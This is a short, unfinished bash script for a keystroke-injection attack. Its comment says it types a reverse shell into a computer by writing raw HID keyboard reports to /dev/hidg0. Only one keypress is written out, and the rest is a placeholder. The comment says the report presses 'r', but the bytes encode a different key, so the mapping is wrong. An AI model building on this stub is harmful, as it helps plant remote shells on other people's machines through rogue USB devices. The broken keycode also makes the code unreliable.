#!/bin/bash
# Inject reverse shell as keystrokes

echo -ne '\0\0\x0f\0\0\0\0\0' > /dev/hidg0  # Press 'r'
sleep 0.1
# Add more HID injection here...
